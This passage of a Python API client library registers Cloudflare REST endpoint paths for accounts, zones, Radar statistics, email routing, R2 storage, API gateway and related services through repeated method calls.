    self.add('AUTH', 'accounts', 'ai/run/@cf/tinyllama/tinyllama-1.1b-chat-v1.0')
    self.add('AUTH', 'accounts', 'ai/run/@cf/unum/uform-gen2-qwen-500m')

    self.add('AUTH', 'accounts', 'ai/run/@hf/baai/bge-base-en-v1.5')
    self.add('AUTH', 'accounts', 'ai/run/@hf/baai/bge-m3')
    self.add('AUTH', 'accounts', 'ai/run/@hf/google/gemma-7b-it')
    self.add('AUTH', 'accounts', 'ai/run/@hf/meta-llama/meta-llama-3-8b-instruct')
    self.add('AUTH', 'accounts', 'ai/run/@hf/mistral/mistral-7b-instruct-v0.2')
    self.add('AUTH', 'accounts', 'ai/run/@hf/nexusflow/starling-lm-7b-beta')
    self.add('AUTH', 'accounts', 'ai/run/@hf/nousresearch/hermes-2-pro-mistral-7b')
    self.add('AUTH', 'accounts', 'ai/run/@hf/sentence-transformers/all-minilm-l6-v2')
    self.add('AUTH', 'accounts', 'ai/run/@hf/thebloke/codellama-7b-instruct-awq')
    self.add('AUTH', 'accounts', 'ai/run/@hf/thebloke/deepseek-coder-6.7b-base-awq')
    self.add('AUTH', 'accounts', 'ai/run/@hf/thebloke/deepseek-coder-6.7b-instruct-awq')
    self.add('AUTH', 'accounts', 'ai/run/@hf/thebloke/llama-2-13b-chat-awq')
    self.add('AUTH', 'accounts', 'ai/run/@hf/thebloke/llamaguard-7b-awq')
    self.add('AUTH', 'accounts', 'ai/run/@hf/thebloke/mistral-7b-instruct-v0.1-awq')
    self.add('AUTH', 'accounts', 'ai/run/@hf/thebloke/neural-chat-7b-v3-1-awq')
    self.add('AUTH', 'accounts', 'ai/run/@hf/thebloke/openchat_3.5-awq')
    self.add('AUTH', 'accounts', 'ai/run/@hf/thebloke/openhermes-2.5-mistral-7b-awq')
    self.add('AUTH', 'accounts', 'ai/run/@hf/thebloke/orca-2-13b-awq')
    self.add('AUTH', 'accounts', 'ai/run/@hf/thebloke/starling-lm-7b-alpha-awq')
    self.add('AUTH', 'accounts', 'ai/run/@hf/thebloke/zephyr-7b-beta-awq')

    self.add('AUTH', 'accounts', 'ai/run/proxy')
    self.add('AUTH', 'accounts', 'ai/tasks/search')

def accounts_extras(self):
    """ :meta private: """

    self.add('AUTH', 'accounts', 'alerting/v3/available_alerts')
    self.add('AUTH', 'accounts', 'alerting/v3/destinations/eligible')
    self.add('AUTH', 'accounts', 'alerting/v3/destinations/pagerduty')
    self.add('AUTH', 'accounts', 'alerting/v3/destinations/pagerduty/connect')
    self.add('AUTH', 'accounts', 'alerting/v3/destinations/webhooks')
    self.add('AUTH', 'accounts', 'alerting/v3/history')
    self.add('AUTH', 'accounts', 'alerting/v3/policies')

    self.add('AUTH', 'accounts', 'calls/apps')
    self.add('AUTH', 'accounts', 'calls/turn_keys')

    self.add('AUTH', 'accounts', 'custom_ns')
    self.add('AUTH', 'accounts', 'custom_ns/availability')
    self.add('AUTH', 'accounts', 'custom_ns/verify')

    self.add('AUTH', 'accounts', 'devices')
    self.add('AUTH', 'accounts', 'devices', 'override_codes')
    self.add('AUTH', 'accounts', 'devices/dex_tests')
    self.add('AUTH', 'accounts', 'devices/networks')
    self.add('AUTH', 'accounts', 'devices/policies')
    self.add('AUTH', 'accounts', 'devices/policy')
    self.add('AUTH', 'accounts', 'devices/policy', 'exclude')
#   self.add('AUTH', 'accounts', 'devices/policy/exclude')
    self.add('AUTH', 'accounts', 'devices/policy', 'fallback_domains')
#   self.add('AUTH', 'accounts', 'devices/policy/fallback_domains')
    self.add('AUTH', 'accounts', 'devices/policy', 'include')
#   self.add('AUTH', 'accounts', 'devices/policy/include')
    self.add('AUTH', 'accounts', 'devices/posture')
    self.add('AUTH', 'accounts', 'devices/posture/integration')
    self.add('AUTH', 'accounts', 'devices/revoke')
    self.add('AUTH', 'accounts', 'devices/settings')
    self.add('AUTH', 'accounts', 'devices/unrevoke')

    self.add('AUTH', 'accounts', 'dex/colos')
    self.add('AUTH', 'accounts', 'dex/fleet-status/devices')
    self.add('AUTH', 'accounts', 'dex/fleet-status/live')
    self.add('AUTH', 'accounts', 'dex/fleet-status/over-time')
    self.add('AUTH', 'accounts', 'dex/http-tests')
    self.add('AUTH', 'accounts', 'dex/http-tests', 'percentiles')
    self.add('AUTH', 'accounts', 'dex/tests')
    self.add('AUTH', 'accounts', 'dex/tests/unique-devices')
    self.add('AUTH', 'accounts', 'dex/traceroute-test-results', 'network-path')
    self.add('AUTH', 'accounts', 'dex/traceroute-tests')
    self.add('AUTH', 'accounts', 'dex/traceroute-tests', 'network-path')
    self.add('AUTH', 'accounts', 'dex/traceroute-tests', 'percentiles')

    self.add('AUTH', 'accounts', 'dns_firewall')
    self.add('AUTH', 'accounts', 'dns_firewall', 'dns_analytics/report')
    self.add('AUTH', 'accounts', 'dns_firewall', 'dns_analytics/report/bytime')

    self.add('AUTH', 'accounts', 'gateway')
    self.add('AUTH', 'accounts', 'gateway/app_types')
    self.add('AUTH', 'accounts', 'gateway/audit_ssh_settings')
    self.add('AUTH', 'accounts', 'gateway/categories')
    self.add('AUTH', 'accounts', 'gateway/configuration')
    self.add('AUTH', 'accounts', 'gateway/lists')
    self.add('AUTH', 'accounts', 'gateway/lists', 'items')
    self.add('AUTH', 'accounts', 'gateway/locations')
    self.add('AUTH', 'accounts', 'gateway/logging')
    self.add('AUTH', 'accounts', 'gateway/proxy_endpoints')
    self.add('AUTH', 'accounts', 'gateway/rules')

    self.add('AUTH', 'accounts', 'images/v1', content_type={'POST':'multipart/form-data'})
    self.add('AUTH', 'accounts', 'images/v1', 'blob')
    self.add('AUTH', 'accounts', 'images/v1/config')
    self.add('AUTH', 'accounts', 'images/v1/keys')
    self.add('AUTH', 'accounts', 'images/v1/stats')
    self.add('AUTH', 'accounts', 'images/v1/variants')
    self.add('AUTH', 'accounts', 'images/v2')
    self.add('AUTH', 'accounts', 'images/v2/direct_upload', content_type={'POST':'multipart/form-data'})

    self.add('AUTH', 'accounts', 'intel-phishing/predict')
    self.add('AUTH', 'accounts', 'intel/asn')
    self.add('AUTH', 'accounts', 'intel/asn', 'subnets')
    self.add('AUTH', 'accounts', 'intel/attack-surface-report', 'dismiss')
    self.add('AUTH', 'accounts', 'intel/attack-surface-report/issue-types')
    self.add('AUTH', 'accounts', 'intel/attack-surface-report/issues')
    self.add('AUTH', 'accounts', 'intel/attack-surface-report/issues/class')
    self.add('AUTH', 'accounts', 'intel/attack-surface-report/issues/severity')
    self.add('AUTH', 'accounts', 'intel/attack-surface-report/issues/type')
    self.add('AUTH', 'accounts', 'intel/dns')
    self.add('AUTH', 'accounts', 'intel/domain')
    self.add('AUTH', 'accounts', 'intel/domain-history')
    self.add('AUTH', 'accounts', 'intel/domain/bulk')
    self.add('AUTH', 'accounts', 'intel/indicator-feeds')
    self.add('AUTH', 'accounts', 'intel/indicator-feeds', 'data')
    self.add('AUTH', 'accounts', 'intel/indicator-feeds', 'snapshot', content_type={'PUT':'multipart/form-data'})
    self.add('AUTH', 'accounts', 'intel/indicator-feeds/permissions/add')
    self.add('AUTH', 'accounts', 'intel/indicator-feeds/permissions/remove')
    self.add('AUTH', 'accounts', 'intel/indicator-feeds/permissions/view')
    self.add('AUTH', 'accounts', 'intel/ip')
    self.add('AUTH', 'accounts', 'intel/ip-list')
    self.add('AUTH', 'accounts', 'intel/miscategorization')
    self.add('AUTH', 'accounts', 'intel/sinkholes')
    self.add('AUTH', 'accounts', 'intel/whois')

    self.add('AUTH', 'accounts', 'magic/cf_interconnects')
    self.add('AUTH', 'accounts', 'magic/gre_tunnels')
    self.add('AUTH', 'accounts', 'magic/ipsec_tunnels')
    self.add('AUTH', 'accounts', 'magic/ipsec_tunnels', 'psk_generate')
    self.add('AUTH', 'accounts', 'magic/routes')
    self.add('AUTH', 'accounts', 'magic/sites')
    self.add('AUTH', 'accounts', 'magic/sites', 'acls')
    self.add('AUTH', 'accounts', 'magic/sites', 'lans')
    self.add('AUTH', 'accounts', 'magic/sites', 'wans')

    self.add('AUTH', 'accounts', 'pages/projects')
    self.add('AUTH', 'accounts', 'pages/projects', 'deployments', content_type={'POST':'multipart/form-data'})
    self.add('AUTH', 'accounts', 'pages/projects', 'deployments', 'history/logs')
    self.add('AUTH', 'accounts', 'pages/projects', 'deployments', 'retry')
    self.add('AUTH', 'accounts', 'pages/projects', 'deployments', 'rollback')
    self.add('AUTH', 'accounts', 'pages/projects', 'domains')
    self.add('AUTH', 'accounts', 'pages/projects', 'purge_build_cache')

    self.add('AUTH', 'accounts', 'pcaps')
    self.add('AUTH', 'accounts', 'pcaps', 'download')
    self.add('AUTH', 'accounts', 'pcaps/ownership')
    self.add('AUTH', 'accounts', 'pcaps/ownership/validate')

    self.add('AUTH', 'accounts', 'queues')
    self.add('AUTH', 'accounts', 'queues', 'consumers')
    self.add('AUTH', 'accounts', 'queues', 'messages/ack')
    self.add('AUTH', 'accounts', 'queues', 'messages/pull')

    self.add('AUTH', 'accounts', 'teamnet/routes')
    self.add('AUTH', 'accounts', 'teamnet/routes/ip')
    self.add('AUTH', 'accounts', 'teamnet/routes/network')
    self.add('AUTH', 'accounts', 'teamnet/virtual_networks')

    self.add('AUTH', 'accounts', 'urlscanner/scan')
    self.add('AUTH', 'accounts', 'urlscanner/scan', 'har')
    self.add('AUTH', 'accounts', 'urlscanner/scan', 'screenshot')

    self.add('AUTH', 'accounts', 'hyperdrive/configs')

    self.add('AUTH', 'accounts', 'warp_connector')
    self.add('AUTH', 'accounts', 'warp_connector', 'token')

    self.add('AUTH', 'accounts', 'zerotrust/connectivity_settings')

    self.add('AUTH', 'accounts', 'd1/database')
    self.add('AUTH', 'accounts', 'd1/database', 'query')

    self.add('AUTH', 'accounts', 'zt_risk_scoring')
    self.add('AUTH', 'accounts', 'zt_risk_scoring', 'reset')
    self.add('AUTH', 'accounts', 'zt_risk_scoring/behaviors')
    self.add('AUTH', 'accounts', 'zt_risk_scoring/summary')

def zones_extras(self):
    """ :meta private: """

    self.add('AUTH', 'zones', 'acm/total_tls')

    self.add('AUTH', 'zones', 'cache/cache_reserve')
    self.add('AUTH', 'zones', 'cache/cache_reserve_clear')
    self.add('AUTH', 'zones', 'cache/origin_post_quantum_encryption')
    self.add('AUTH', 'zones', 'cache/regional_tiered_cache')
    self.add('AUTH', 'zones', 'cache/tiered_cache_smart_topology_enable')
    self.add('AUTH', 'zones', 'cache/variants')

    self.add('AUTH', 'zones', 'managed_headers')
    self.add('AUTH', 'zones', 'page_shield')
    self.add('AUTH', 'zones', 'page_shield/policies')
    self.add('AUTH', 'zones', 'page_shield/scripts')
    self.add('AUTH', 'zones', 'page_shield/connections')
    self.add('AUTH', 'zones', 'rulesets')
    self.add('AUTH', 'zones', 'rulesets', 'rules')
    self.add('AUTH', 'zones', 'rulesets', 'versions')
    self.add('AUTH', 'zones', 'rulesets/phases', 'entrypoint')
    self.add('AUTH', 'zones', 'rulesets/phases', 'entrypoint/versions')
    self.add('AUTH', 'zones', 'rulesets/phases', 'versions')
    self.add('AUTH', 'zones', 'rulesets/phases/http_custom_errors/entrypoint')
    self.add('AUTH', 'zones', 'rulesets/phases/http_config_settings/entrypoint')
    self.add('AUTH', 'zones', 'rulesets/phases/http_request_dynamic_redirect/entrypoint')
    self.add('AUTH', 'zones', 'rulesets/phases/http_request_origin/entrypoint')

    self.add('AUTH', 'zones', 'url_normalization')

    self.add('AUTH', 'zones', 'hostnames/settings')
    self.add('AUTH', 'zones', 'snippets', content_type={'PUT':'multipart/form-data'})
    self.add('AUTH', 'zones', 'snippets', 'content')
    self.add('AUTH', 'zones', 'snippets/snippet_rules')

    self.add('AUTH', 'zones', 'speed_api/availabilities')
    self.add('AUTH', 'zones', 'speed_api/pages')
    self.add('AUTH', 'zones', 'speed_api/pages', 'tests')
    self.add('AUTH', 'zones', 'speed_api/pages', 'trend')
    self.add('AUTH', 'zones', 'speed_api/schedule')

    self.add('AUTH', 'zones', 'dcv_delegation/uuid')

def zones_web3(self):
    """ :meta private: """

    self.add('AUTH', 'zones', 'web3/hostnames')
    self.add('AUTH', 'zones', 'web3/hostnames', 'ipfs_universal_path/content_list')
    self.add('AUTH', 'zones', 'web3/hostnames', 'ipfs_universal_path/content_list/entries')

def accounts_email(self):
    """ :meta private: """

    self.add('AUTH', 'accounts', 'email/routing/addresses')

def accounts_r2(self):
    """ :meta private: """

    self.add('AUTH', 'accounts', 'r2/buckets')
    self.add('AUTH', 'accounts', 'r2/buckets', 'usage')
    self.add('AUTH', 'accounts', 'r2/buckets', 'objects')
    self.add('AUTH', 'accounts', 'r2/buckets', 'sippy')

    self.add('AUTH', 'accounts', 'event_notifications/r2', 'configuration')
    self.add('AUTH', 'accounts', 'event_notifications/r2', 'configuration/queues')


def zones_email(self):
    """ :meta private: """

    self.add('AUTH', 'zones', 'email/routing')
    self.add('AUTH', 'zones', 'email/routing/disable')
    self.add('AUTH', 'zones', 'email/routing/dns')
    self.add('AUTH', 'zones', 'email/routing/enable')
    self.add('AUTH', 'zones', 'email/routing/rules')
    self.add('AUTH', 'zones', 'email/routing/rules/catch_all')

def zones_api_gateway(self):
    """ :meta private: """

    self.add('AUTH', 'zones', 'api_gateway/configuration')
    self.add('AUTH', 'zones', 'api_gateway/discovery')
    self.add('AUTH', 'zones', 'api_gateway/discovery/operations')
    self.add('AUTH', 'zones', 'api_gateway/operations')
    self.add('AUTH', 'zones', 'api_gateway/operations', 'schema_validation')
#   self.add('AUTH', 'zones', 'api_gateway/operations/schema_validation')
    self.add('AUTH', 'zones', 'api_gateway/schemas')
    self.add('AUTH', 'zones', 'api_gateway/settings/schema_validation')
    self.add('AUTH', 'zones', 'api_gateway/user_schemas', content_type={'POST':'multipart/form-data'})
    self.add('AUTH', 'zones', 'api_gateway/user_schemas', 'operations')

def radar(self):
    """ :meta private: """

    self.add('AUTH', 'radar/alerts')
    self.add('AUTH', 'radar/alerts/locations')
    self.add('AUTH', 'radar/annotations/outages')
    self.add('AUTH', 'radar/annotations/outages/locations')

    self.add('AUTH', 'radar/datasets')
    self.add('AUTH', 'radar/datasets/download')

    self.add('AUTH', 'radar/dns/top/ases')
    self.add('AUTH', 'radar/dns/top/locations')

    self.add('AUTH', 'radar/entities/asns')
    self.add('AUTH', 'radar/entities/asns', 'rel')
    self.add('AUTH', 'radar/entities/asns/ip')
    self.add('AUTH', 'radar/entities/ip')
    self.add('AUTH', 'radar/entities/locations')

    self.add('AUTH', 'radar/netflows/timeseries')
    self.add('AUTH', 'radar/netflows/top/ases')
    self.add('AUTH', 'radar/netflows/top/locations')

    self.add('AUTH', 'radar/performance/iqi/summary')
    self.add('AUTH', 'radar/performance/iqi/timeseries_groups')

    self.add('AUTH', 'radar/quality/iqi/summary')
    self.add('AUTH', 'radar/quality/iqi/timeseries_groups')
    self.add('AUTH', 'radar/quality/speed/histogram')
    self.add('AUTH', 'radar/quality/speed/summary')
    self.add('AUTH', 'radar/quality/speed/top/ases')
    self.add('AUTH', 'radar/quality/speed/top/locations')

    self.add('AUTH', 'radar/ranking/domain')
    self.add('AUTH', 'radar/ranking/timeseries')
    self.add('AUTH', 'radar/ranking/timeseries_groups')
    self.add('AUTH', 'radar/ranking/top')

    self.add('AUTH', 'radar/search/global')

    self.add('AUTH', 'radar/specialevents')

    self.add('AUTH', 'radar/verified_bots/top/bots')
    self.add('AUTH', 'radar/verified_bots/top/categories')

    self.add('AUTH', 'radar/connection_tampering/summary')
    self.add('AUTH', 'radar/connection_tampering/timeseries_groups')
    self.add('AUTH', 'radar/traffic_anomalies')
    self.add('AUTH', 'radar/traffic_anomalies/locations')

def radar_as112(self):
    """ :meta private: """

    self.add('AUTH', 'radar/as112/summary/dnssec')
    self.add('AUTH', 'radar/as112/summary/edns')
    self.add('AUTH', 'radar/as112/summary/ip_version')
    self.add('AUTH', 'radar/as112/summary/protocol')
    self.add('AUTH', 'radar/as112/summary/query_type')
    self.add('AUTH', 'radar/as112/summary/response_codes')

    self.add('AUTH', 'radar/as112/timeseries')
    self.add('AUTH', 'radar/as112/timeseries/dnssec')
    self.add('AUTH', 'radar/as112/timeseries/edns')
    self.add('AUTH', 'radar/as112/timeseries/ip_version')
    self.add('AUTH', 'radar/as112/timeseries/protocol')
    self.add('AUTH', 'radar/as112/timeseries/query_type')
    self.add('AUTH', 'radar/as112/timeseries/response_codes')

    self.add('AUTH', 'radar/as112/timeseries_groups/dnssec')
    self.add('AUTH', 'radar/as112/timeseries_groups/edns')
    self.add('AUTH', 'radar/as112/timeseries_groups/ip_version')
    self.add('AUTH', 'radar/as112/timeseries_groups/protocol')
    self.add('AUTH', 'radar/as112/timeseries_groups/query_type')
    self.add('AUTH', 'radar/as112/timeseries_groups/response_codes')

    self.add('AUTH', 'radar/as112/top/locations')
    self.add('AUTH', 'radar/as112/top/locations/dnssec')
    self.add('AUTH', 'radar/as112/top/locations/edns')
    self.add('AUTH', 'radar/as112/top/locations/ip_version')

def radar_attacks(self):
    """ :meta private: """

    self.add('AUTH', 'radar/attacks/layer3/summary')
    self.add('AUTH', 'radar/attacks/layer3/timeseries')
    self.add('AUTH', 'radar/attacks/layer3/timeseries_groups')
    self.add('AUTH', 'radar/attacks/layer3/summary/bitrate')
    self.add('AUTH', 'radar/attacks/layer3/summary/duration')
    self.add('AUTH', 'radar/attacks/layer3/summary/ip_version')
    self.add('AUTH', 'radar/attacks/layer3/summary/protocol')
    self.add('AUTH', 'radar/attacks/layer3/summary/vector')
    self.add('AUTH', 'radar/attacks/layer3/timeseries_groups/bitrate')
    self.add('AUTH', 'radar/attacks/layer3/timeseries_groups/duration')
    self.add('AUTH', 'radar/attacks/layer3/timeseries_groups/industry')
    self.add('AUTH', 'radar/attacks/layer3/timeseries_groups/ip_version')
    self.add('AUTH', 'radar/attacks/layer3/timeseries_groups/protocol')
    self.add('AUTH', 'radar/attacks/layer3/timeseries_groups/vector')
    self.add('AUTH', 'radar/attacks/layer3/timeseries_groups/vertical')
    self.add('AUTH', 'radar/attacks/layer3/top/attacks')
    self.add('AUTH', 'radar/attacks/layer3/top/industry')
    self.add('AUTH', 'radar/attacks/layer3/top/locations/origin')
    self.add('AUTH', 'radar/attacks/layer3/top/locations/target')
    self.add('AUTH', 'radar/attacks/layer3/top/vertical')

    self.add('AUTH', 'radar/attacks/layer7/summary')
    self.add('AUTH', 'radar/attacks/layer7/summary/http_method')
    self.add('AUTH', 'radar/attacks/layer7/summary/http_version')
    self.add('AUTH', 'radar/attacks/layer7/summary/ip_version')
    self.add('AUTH', 'radar/attacks/layer7/summary/managed_rules')
    self.add('AUTH', 'radar/attacks/layer7/summary/mitigation_product')
    self.add('AUTH', 'radar/attacks/layer7/timeseries')
    self.add('AUTH', 'radar/attacks/layer7/timeseries_groups')
    self.add('AUTH', 'radar/attacks/layer7/timeseries_groups/http_method')
    self.add('AUTH', 'radar/attacks/layer7/timeseries_groups/http_version')
    self.add('AUTH', 'radar/attacks/layer7/timeseries_groups/industry')
    self.add('AUTH', 'radar/attacks/layer7/timeseries_groups/ip_version')
    self.add('AUTH', 'radar/attacks/layer7/timeseries_groups/managed_rules')
    self.add('AUTH', 'radar/attacks/layer7/timeseries_groups/mitigation_product')
    self.add('AUTH', 'radar/attacks/layer7/timeseries_groups/vertical')
    self.add('AUTH', 'radar/attacks/layer7/top/ases/origin')
    self.add('AUTH', 'radar/attacks/layer7/top/attacks')
    self.add('AUTH', 'radar/attacks/layer7/top/industry')
    self.add('AUTH', 'radar/attacks/layer7/top/locations/origin')
    self.add('AUTH', 'radar/attacks/layer7/top/locations/target')
    self.add('AUTH', 'radar/attacks/layer7/top/vertical')

def radar_bgp(self):
    """ :meta private: """

    self.add('AUTH', 'radar/bgp/leaks/events')
    self.add('AUTH', 'radar/bgp/timeseries')
    self.add('AUTH', 'radar/bgp/top/ases')
    self.add('AUTH', 'radar/bgp/top/ases/prefixes')
    self.add('AUTH', 'radar/bgp/top/prefixes')
    self.add('AUTH', 'radar/bgp/hijacks/events')
    self.add('AUTH', 'radar/bgp/routes/moas')
    self.add('AUTH', 'radar/bgp/routes/pfx2as')
    self.add('AUTH', 'radar/bgp/routes/stats')
    self.add('AUTH', 'radar/bgp/routes/timeseries')

def radar_email(self):
    """ :meta private: """

    self.add('AUTH', 'radar/email/routing/summary/arc')
    self.add('AUTH', 'radar/email/routing/summary/dkim')
    self.add('AUTH', 'radar/email/routing/summary/dmarc')
    self.add('AUTH', 'radar/email/routing/summary/encrypted')
    self.add('AUTH', 'radar/email/routing/summary/ip_version')
    self.add('AUTH', 'radar/email/routing/summary/spf')
    self.add('AUTH', 'radar/email/routing/timeseries_groups/arc')
    self.add('AUTH', 'radar/email/routing/timeseries_groups/dkim')
    self.add('AUTH', 'radar/email/routing/timeseries_groups/dmarc')
    self.add('AUTH', 'radar/email/routing/timeseries_groups/encrypted')
    self.add('AUTH', 'radar/email/routing/timeseries_groups/ip_version')
    self.add('AUTH', 'radar/email/routing/timeseries_groups/spf')

    self.add('AUTH', 'radar/email/security/summary/arc')
    self.add('AUTH', 'radar/email/security/summary/dkim')
    self.add('AUTH', 'radar/email/security/summary/dmarc')
    self.add('AUTH', 'radar/email/security/summary/malicious')
    self.add('AUTH', 'radar/email/security/summary/spam')
    self.add('AUTH', 'radar/email/security/summary/spf')
    self.add('AUTH', 'radar/email/security/summary/spoof')
    self.add('AUTH', 'radar/email/security/summary/threat_category')
    self.add('AUTH', 'radar/email/security/summary/tls_version')

    self.add('AUTH', 'radar/email/security/timeseries/arc')
    self.add('AUTH', 'radar/email/security/timeseries/dkim')
    self.add('AUTH', 'radar/email/security/timeseries/dmarc')
    self.add('AUTH', 'radar/email/security/timeseries/malicious')
    self.add('AUTH', 'radar/email/security/timeseries/spam')
    self.add('AUTH', 'radar/email/security/timeseries/spf')
    self.add('AUTH', 'radar/email/security/timeseries/threat_category')
    self.add('AUTH', 'radar/email/security/timeseries_groups/arc')
    self.add('AUTH', 'radar/email/security/timeseries_groups/dkim')
    self.add('AUTH', 'radar/email/security/timeseries_groups/dmarc')
    self.add('AUTH', 'radar/email/security/timeseries_groups/malicious')
    self.add('AUTH', 'radar/email/security/timeseries_groups/spam')
    self.add('AUTH', 'radar/email/security/timeseries_groups/spf')
    self.add('AUTH', 'radar/email/security/timeseries_groups/spoof')
    self.add('AUTH', 'radar/email/security/timeseries_groups/threat_category')
    self.add('AUTH', 'radar/email/security/timeseries_groups/tls_version')

    self.add('AUTH', 'radar/email/security/top/ases')
    self.add('AUTH', 'radar/email/security/top/ases/arc')
    self.add('AUTH', 'radar/email/security/top/ases/dkim')
    self.add('AUTH', 'radar/email/security/top/ases/dmarc')
    self.add('AUTH', 'radar/email/security/top/ases/malicious')
    self.add('AUTH', 'radar/email/security/top/ases/spam')
    self.add('AUTH', 'radar/email/security/top/ases/spf')
    self.add('AUTH', 'radar/email/security/top/locations')
    self.add('AUTH', 'radar/email/security/top/locations/arc')
    self.add('AUTH', 'radar/email/security/top/locations/dkim')
    self.add('AUTH', 'radar/email/security/top/locations/dmarc')
    self.add('AUTH', 'radar/email/security/top/locations/malicious')
    self.add('AUTH', 'radar/email/security/top/locations/spam')
    self.add('AUTH', 'radar/email/security/top/locations/spf')
    self.add('AUTH', 'radar/email/security/top/tlds')
    self.add('AUTH', 'radar/email/security/top/tlds/malicious')
    self.add('AUTH', 'radar/email/security/top/tlds/spam')
    self.add('AUTH', 'radar/email/security/top/tlds/spoof')

def radar_http(self):
    """ :meta private: """


    self.add('AUTH', 'radar/http/summary/bot_class')
    self.add('AUTH', 'radar/http/summary/device_type')
    self.add('AUTH', 'radar/http/summary/http_protocol')
    self.add('AUTH', 'radar/http/summary/http_version')
    self.add('AUTH', 'radar/http/summary/ip_version')
    self.add('AUTH', 'radar/http/summary/os')
    self.add('AUTH', 'radar/http/summary/post_quantum')
    self.add('AUTH', 'radar/http/summary/tls_version')

    self.add('AUTH', 'radar/http/timeseries/bot_class')
    self.add('AUTH', 'radar/http/timeseries/browser')
    self.add('AUTH', 'radar/http/timeseries/browser_family')
    self.add('AUTH', 'radar/http/timeseries/device_type')
    self.add('AUTH', 'radar/http/timeseries/http_protocol')
    self.add('AUTH', 'radar/http/timeseries/http_version')
    self.add('AUTH', 'radar/http/timeseries/ip_version')
    self.add('AUTH', 'radar/http/timeseries/os')
    self.add('AUTH', 'radar/http/timeseries/tls_version')

    self.add('AUTH', 'radar/http/timeseries_groups/bot_class')
    self.add('AUTH', 'radar/http/timeseries_groups/browser')
    self.add('AUTH', 'radar/http/timeseries_groups/browser_family')
    self.add('AUTH', 'radar/http/timeseries_groups/device_type')
    self.add('AUTH', 'radar/http/timeseries_groups/http_protocol')
    self.add('AUTH', 'radar/http/timeseries_groups/http_version')
    self.add('AUTH', 'radar/http/timeseries_groups/ip_version')
    self.add('AUTH', 'radar/http/timeseries_groups/os')
    self.add('AUTH', 'radar/http/timeseries_groups/post_quantum')
    self.add('AUTH', 'radar/http/timeseries_groups/tls_version')

    self.add('AUTH', 'radar/http/top/ases')
    self.add('AUTH', 'radar/http/top/ases/bot_class')
    self.add('AUTH', 'radar/http/top/ases/browser_family')
    self.add('AUTH', 'radar/http/top/ases/device_type')
    self.add('AUTH', 'radar/http/top/ases/http_protocol')
    self.add('AUTH', 'radar/http/top/ases/http_version')
    self.add('AUTH', 'radar/http/top/ases/ip_version')
    self.add('AUTH', 'radar/http/top/ases/os')
    self.add('AUTH', 'radar/http/top/ases/tls_version')
    self.add('AUTH', 'radar/http/top/browsers')
    self.add('AUTH', 'radar/http/top/browser_families')
    self.add('AUTH', 'radar/http/top/locations')
    self.add('AUTH', 'radar/http/top/locations/bot_class')
    self.add('AUTH', 'radar/http/top/locations/browser_family')
    self.add('AUTH', 'radar/http/top/locations/device_type')
    self.add('AUTH', 'radar/http/top/locations/http_protocol')
    self.add('AUTH', 'radar/http/top/locations/http_version')
    self.add('AUTH', 'radar/http/top/locations/ip_version')
    self.add('AUTH', 'radar/http/top/locations/os')
    self.add('AUTH', 'radar/http/top/locations/tls_version')

def from_developers(self):
    """ :meta private: """

    self.add('AUTH', 'accounts', 'analytics_engine/sql')

    self.add('AUTH', 'accounts', 'logpush/jobs')
    self.add('AUTH', 'accounts', 'logpush/datasets', 'fields')
    self.add('AUTH', 'accounts', 'logpush/datasets', 'jobs')
    self.add('AUTH', 'accounts', 'logpush/ownership')
    self.add('AUTH', 'accounts', 'logpush/ownership/validate')
    self.add('AUTH', 'accounts', 'logpush/validate/destination/exists')
    self.add('AUTH', 'accounts', 'logpush/validate/origin')

    self.add('AUTH', 'accounts', 'logs/retrieve')
    self.add('AUTH', 'accounts', 'logs/control/cmb/config')

    self.add('AUTH', 'accounts', 'magic/advanced_tcp_protection/configs/allowlist')
    self.add('AUTH', 'accounts', 'magic/advanced_tcp_protection/configs/prefixes')
    self.add('AUTH', 'accounts', 'magic/advanced_tcp_protection/configs/prefixes/bulk')
    self.add('AUTH', 'accounts', 'magic/advanced_tcp_protection/configs/syn_protection/rules')
    self.add('AUTH', 'accounts', 'magic/advanced_tcp_protection/configs/tcp_flow_protection/rules')
    self.add('AUTH', 'accounts', 'magic/advanced_tcp_protection/configs/tcp_protection_status')

    self.add('AUTH', 'accounts', 'pubsub/namespaces')
    self.add('AUTH', 'accounts', 'pubsub/namespaces', 'brokers')
    self.add('AUTH', 'accounts', 'pubsub/namespaces', 'brokers', 'credentials')

    self.add('AUTH', 'accounts', 'rulesets/phases/ddos_l4/entrypoint')
    self.add('AUTH', 'accounts', 'rulesets/phases/ddos_l7/entrypoint')
    self.add('AUTH', 'accounts', 'rulesets/phases/http_request_firewall_custom/entrypoint')
    self.add('AUTH', 'accounts', 'rulesets/phases/http_request_firewall_managed/entrypoint')

    self.add('AUTH', 'accounts', 'stream', 'captions', 'vtt')
    self.add('AUTH', 'accounts', 'stream/analytics/views')
    self.add('AUTH', 'accounts', 'stream/live_inputs', 'videos')
    self.add('AUTH', 'accounts', 'stream/storage-usage')

#   self.add('AUTH', 'organizations', 'load_balancers/monitors')

    self.add('AUTH', 'users')

    self.add('AUTH', 'zones', 'content-upload-scan/disable')
    self.add('AUTH', 'zones', 'content-upload-scan/enable')
    self.add('AUTH', 'zones', 'content-upload-scan/payloads')
    self.add('AUTH', 'zones', 'content-upload-scan/settings')

    self.add('AUTH', 'zones', 'phases/http_request_firewall_managed/entrypoint')

    self.add('AUTH', 'zones', 'rulesets/phases/ddos_l7/entrypoint')
    self.add('AUTH', 'zones', 'rulesets/phases/http_ratelimit/entrypoint')
    self.add('AUTH', 'zones', 'rulesets/phases/http_request_cache_settings/entrypoint')
    self.add('AUTH', 'zones', 'rulesets/phases/http_request_firewall_custom/entrypoint')
    self.add('AUTH', 'zones', 'rulesets/phases/http_request_firewall_managed/entrypoint')
    self.add('AUTH', 'zones', 'rulesets/phases/http_request_firewall_managed/entrypoint/versions')

    self.add('AUTH', 'zones', 'certificate_authorities/hostname_associations')
    self.add('AUTH', 'zones', 'hold')

    self.add('AUTH', 'accounts', 'challenges/widgets')
    self.add('AUTH', 'accounts', 'challenges/widgets', 'rotate_secret')
    self.add('AUTH', 'accounts', 'mtls_certificates')
    self.add('AUTH', 'accounts', 'mtls_certificates', 'associations')
    self.add('AUTH', 'accounts', 'request-tracer/trace')

def accounts_cloudforce_one(self):
    """ :meta private: """

    self.add('AUTH', 'accounts', 'cloudforce-one/requests')
    self.add('AUTH', 'accounts', 'cloudforce-one/requests', 'message')
    self.add('AUTH', 'accounts', 'cloudforce-one/requests', 'message/new')
    self.add('AUTH', 'accounts', 'cloudforce-one/requests/constants')
    self.add('AUTH', 'accounts', 'cloudforce-one/requests/new')
    self.add('AUTH', 'accounts', 'cloudforce-one/requests/priority')
